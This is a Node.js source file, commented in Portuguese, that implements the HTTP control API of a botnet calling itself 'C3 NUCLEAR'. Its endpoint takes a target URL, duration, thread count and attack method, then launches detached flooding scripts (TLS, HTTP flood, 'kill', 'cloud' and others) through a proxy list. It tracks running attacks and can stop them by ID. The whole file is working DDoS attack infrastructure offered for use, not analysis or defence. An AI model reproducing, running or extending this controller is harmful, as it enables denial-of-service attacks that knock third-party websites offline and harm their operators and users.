// api.js - Botnet C3 API
const http = require('http');
const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

const PORT = 8080;
const PROXY_FILE = 'proxy.txt';
const FIXED_RPS = 5;
const MAX_TIME = 3600;

const DEPENDENCIAS = [
    'axios',
    'canvas',
    'cheerio',
    'cloudscraper',
    'colors',
    'fake-useragent',
    'gradient-string',
    'header-generator',
    'hpack',
    'randomstring',
    'request',
    'socks',
    'telegraf',
    'user-agents'
];

const METHODS = {
    'kill':      { script: 'gpzkill.js',   nome: 'KILL' },
    'ar':        { script: 'ar.js',        nome: 'GPZ-AR' },
    'gpz-ar':    { script: 'ar.js',        nome: 'GPZ-AR' },
    'wx':        { script: 'gpzwx.js',     nome: 'WX' },
    'gpz-wx':    { script: 'gpzwx.js',     nome: 'WX' },
    'tls':       { script: 'tls.js',       nome: 'TLS' },
    'tls1':      { script: 'tls1.js',      nome: 'TLS1' },
    'http':      { script: 'http.js',      nome: 'HTTP' },
    'flooder':   { script: 'flooder.js',   nome: 'FLOODER' },
    'flood':     { script: 'flooder.js',   nome: 'FLOODER' },
    'c3':        { script: 'c3.js',        nome: 'C3' },
    'cloud':     { script: 'cloud.js',     nome: 'CLOUD' }
};

let totalAttacks = 0;
const activeAttacks = new Map();
const usedIds = new Set();

function log(msg) {
    const ts = new Date().toLocaleTimeString('pt-BR');
    console.log('[' + ts + '] ' + msg);
}

function sendJson(res, statusCode, data) {
    const body = JSON.stringify(data, null, 2);
    res.writeHead(statusCode, {
        'Content-Type': 'application/json; charset=utf-8',
        'Access-Control-Allow-Origin': '*'
    });
    res.end(body);
}

function getMetodosNomes() {
    const nomes = [];
    const vistos = new Set();
    for (const key in METHODS) {
        const nome = METHODS[key].nome;
        if (!vistos.has(nome)) {
            vistos.add(nome);
            nomes.push(nome);
        }
    }
    return nomes;
}

function gerarId() {
    let id;
    let tentativas = 0;
    do {
        id = Math.floor(100000 + Math.random() * 900000);
        tentativas++;
        if (tentativas > 50) {
            id = Date.now() % 1000000;
            break;
        }
    } while (usedIds.has(id) || activeAttacks.has(id));
    usedIds.add(id);
    return id;
}

function parseParams(raw) {
    const normalized = raw.replace(/\?/g, '&');
    const params = {};

    normalized.split('&').forEach(pair => {
        if (!pair) return;
        const idx = pair.indexOf('=');
        if (idx === -1) return;

        const key = pair.substring(0, idx).trim().toLowerCase();
        let val = pair.substring(idx + 1).trim();

        if (!key) return;

        if (key === 'alvo') {
            params.alvo = val;
        } else {
            try {
                params[key] = decodeURIComponent(val);
            } catch (e) {
                params[key] = val;
            }
        }
    });

    return {
        alvo: params.alvo || null,
        time: params.time || null,
        threads: params.threads || null,
        metado: params.metado || null,
        stop: params.stop || null
    };
}

function matarProcesso(proc) {
    if (!proc) return;
    try {
        if (process.platform === 'win32') {
            spawn('taskkill', ['/pid', proc.pid, '/f', '/t']);
        } else {
            try { process.kill(-proc.pid, 'SIGKILL'); } catch (e) {
                try { proc.kill('SIGKILL'); } catch (e2) {}
            }
        }
    } catch (e) {}
}

function pararAtaque(id) {
    const idNum = parseInt(id, 10);
    if (isNaN(idNum)) {
        return { id: id, status: false, error: 'ID inválido' };
    }

    if (!activeAttacks.has(idNum)) {
        return { id: idNum, status: false, error: 'Ataque não encontrado ou já finalizado' };
    }

    const attack = activeAttacks.get(idNum);
    matarProcesso(attack.process);
    activeAttacks.delete(idNum);
    log('🛑 Ataque ' + idNum + ' parado — ' + attack.metodo + ' → ' + attack.target);

    return {
        id: idNum,
        status: true,
        message: 'Ataque parado com sucesso',
        alvo: attack.target,
        metado: attack.metodo
    };
}

function iniciarAtaque(alvo, time, threads, metodoKey) {
    const metodo = METHODS[metodoKey.toLowerCase()];
    if (!metodo) {
        return {
            alvo: alvo || null,
            time: time || null,
            metado: metodoKey || null,
            status: false,
            error: 'Método inválido',
            metodos_disponiveis: getMetodosNomes()
        };
    }

    if (!alvo) {
        return {
            alvo: null,
            time: time || null,
            metado: metodo.nome,
            status: false,
            error: 'Alvo não informado'
        };
    }

    if (!alvo.startsWith('http://') && !alvo.startsWith('https://')) {
        return {
            alvo: alvo,
            time: time || null,
            metado: metodo.nome,
            status: false,
            error: 'Alvo incompleto',
            aviso: 'Alvo correto com https:// ou http://'
        };
    }

    const timeNum = parseInt(time, 10);
    if (isNaN(timeNum) || timeNum < 1 || timeNum > MAX_TIME) {
        return {
            alvo: alvo,
            time: time,
            metado: metodo.nome,
            status: false,
            error: 'Time inválido (1 - ' + MAX_TIME + 's)'
        };
    }

    const threadsNum = parseInt(threads, 10);
    if (isNaN(threadsNum) || threadsNum < 1 || threadsNum > 9999) {
        return {
            alvo: alvo,
            time: timeNum,
            metado: metodo.nome,
            status: false,
            error: 'Threads inválido (1 - 9999)'
        };
    }

    const scriptPath = path.resolve(metodo.script);
    const proxyPath = path.resolve(PROXY_FILE);

    if (!fs.existsSync(scriptPath)) {
        return {
            alvo: alvo,
            time: timeNum,
            metado: metodo.nome,
            status: false,
            error: 'Script não encontrado: ' + metodo.script
        };
    }

    if (!fs.existsSync(proxyPath)) {
        try { fs.writeFileSync(proxyPath, '', 'utf8'); } catch (e) {}
    }

    const args = [
        scriptPath,
        alvo,
        timeNum.toString(),
        FIXED_RPS.toString(),
        threadsNum.toString(),
        proxyPath
    ];

    const cmdPreview = 'node ' + args.map(a => path.basename(a)).join(' ');
    log('▶️  COMANDO: ' + cmdPreview);

    const attackId = gerarId();

    let proc;
    try {
        proc = spawn('node', args, {
            stdio: 'ignore',
            detached: true,
            env: { ...process.env, NODE_NO_WARNINGS: '1' }
        });
        proc.unref();
    } catch (err) {
        log('❌ Script iniciado false — ' + metodo.nome + ' (' + err.message + ')');
        usedIds.delete(attackId);
        return {
            alvo: alvo,
            time: timeNum,
            metado: metodo.nome,
            id: attackId,
            status: false,
            error: 'Falha ao iniciar script: ' + err.message
        };
    }

    if (!proc || !proc.pid) {
        log('❌ Script iniciado false — ' + metodo.nome);
        usedIds.delete(attackId);
        return {
            alvo: alvo,
            time: timeNum,
            metado: metodo.nome,
            id: attackId,
            status: false,
            error: 'Script não iniciou'
        };
    }

    log('✅ Script iniciado true — ' + metodo.nome + ' → ' + alvo + ' (ID: ' + attackId + ')');

    totalAttacks++;

    activeAttacks.set(attackId, {
        id: attackId,
        target: alvo,
        time: timeNum,
        threads: threadsNum,
        metodo: metodo.nome,
        startTime: Date.now(),
        process: proc
    });

    proc.on('exit', (code, signal) => {
        if (activeAttacks.has(attackId)) {
            log('⏹️  Finalizado: ' + metodo.nome + ' → ' + alvo + ' (ID: ' + attackId + ')');
            activeAttacks.delete(attackId);
        }
    });

    proc.on('error', (err) => {
        log('❌ Script erro: ' + metodo.nome + ' (ID: ' + attackId + ') — ' + err.message);
        activeAttacks.delete(attackId);
    });

    return {
        id: attackId,
        alvo: alvo,
        time: timeNum,
        metado: metodo.nome,
        status: true
    };
}

function verificarDependencias() {
    console.log('═══════════════════════════════════════════');
    console.log('🔍 VERIFICANDO DEPENDÊNCIAS...');
    console.log('═══════════════════════════════════════════');

    const faltando = [];
    const ok = [];

    for (const dep of DEPENDENCIAS) {
        try {
            require.resolve(dep);
            console.log('   ✅ ' + dep + ' — instalado');
            ok.push(dep);
        } catch (e) {
            console.log('   ❌ ' + dep + ' — FALTANDO');
            faltando.push(dep);
        }
    }

    console.log('═══════════════════════════════════════════');
    console.log('✅ Instaladas: ' + ok.length + '/' + DEPENDENCIAS.length);

    if (faltando.length > 0) {
        console.log('❌ Faltando: ' + faltando.length);
        console.log('═══════════════════════════════════════════');
        console.log('📋 Instale com:');
        console.log('   npm install ' + faltando.join(' '));
        console.log('═══════════════════════════════════════════');
        return false;
    }

    console.log('🎉 Todas as dependências estão instaladas!');
    console.log('═══════════════════════════════════════════\n');
    return true;
}

if (!verificarDependencias()) {
    console.log('⚠️  API NÃO INICIADA — instale as dependências que faltam e rode novamente.');
    process.exit(1);
}

const server = http.createServer((req, res) => {
    const rawUrl = req.url || '/';

    log('📥 ' + req.method + ' ' + rawUrl);

    const pathClean = rawUrl.split('?')[0].replace(/\/+$/, '') || '/';

    if (pathClean === '/metado' || pathClean === '/metados') {
        return sendJson(res, 200, {
            metados: getMetodosNomes()
        });
    }

    if (rawUrl === '/' || pathClean === '') {
        return sendJson(res, 200, {
            status: true,
            service: 'C3 NUCLEAR BOTNET API',
            version: '1.0.0',
            ataques_iniciados: totalAttacks,
            ataques_ativos: activeAttacks.size,
            dependencias_ok: DEPENDENCIAS.length,
            endpoints: {
                ataque: 'GET /botnetc3api/?alvo=URL?time=TEMPO?threads=THREADS?metado=METADO',
                parar: 'GET /botnetc3api/?stop=ID',
                metados: 'GET /metado'
            },
            metodos_disponiveis: getMetodosNomes(),
            config: {
                rps_fixo: FIXED_RPS,
                max_time: MAX_TIME
            }
        });
    }

    if (pathClean === '/botnetc3api' || pathClean.startsWith('/botnetc3api/')) {
        let raw = rawUrl;

        const prefixMatch = raw.match(/^\/botnetc3api\/?/);
        if (prefixMatch) {
            raw = raw.substring(prefixMatch[0].length);
        }

        if (raw.startsWith('?')) {
            raw = raw.substring(1);
        }

        if (!raw) {
            return sendJson(res, 400, {
                alvo: null,
                time: null,
                metado: null,
                id: null,
                status: false,
                error: 'Parâmetros ausentes'
            });
        }

        const params = parseParams(raw);

        if (params.stop) {
            const result = pararAtaque(params.stop);
            return sendJson(res, result.status ? 200 : 400, result);
        }

        if (!params.alvo || !params.time || !params.threads || !params.metado) {
            return sendJson(res, 400, {
                alvo: params.alvo || null,
                time: params.time || null,
                metado: params.metado || null,
                id: null,
                status: false,
                error: 'Todos os parâmetros são obrigatórios',
                recebido: params
            });
        }

        const result = iniciarAtaque(
            params.alvo,
            params.time,
            params.threads,
            params.metado
        );

        const statusCode = result.status ? 200 : 400;
        return sendJson(res, statusCode, result);
    }

    return sendJson(res, 404, {
        alvo: null,
        time: null,
        metado: null,
        id: null,
        status: false,
        error: 'Rota não encontrada'
    });
});

server.listen(PORT, () => {
    console.log('═══════════════════════════════════════════');
    console.log('☢️  C3 NUCLEAR - API BOTNET');
    console.log('═══════════════════════════════════════════');
    console.log('🌐 Servidor: http://localhost:' + PORT);
    console.log('🎯 Metados: http://localhost:' + PORT + '/metado');
    console.log('⚡ RPS fixo: ' + FIXED_RPS);
    console.log('═══════════════════════════════════════════');
    console.log('📡 Formatos aceitos:');
    console.log('   /botnetc3api/?alvo=URL?time=TEMPO?threads=THREADS?metado=METADO');
    console.log('   /botnetc3api/alvo=URL?time=TEMPO?threads=THREADS?metado=METADO');
    console.log('   /botnetc3api/?stop=ID');
    console.log('═══════════════════════════════════════════\n');
});

process.on('SIGINT', () => {
    console.log('\n🛑 Finalizando API...');
    for (const [id, attack] of activeAttacks) {
        matarProcesso(attack.process);
    }
    process.exit(0);
});
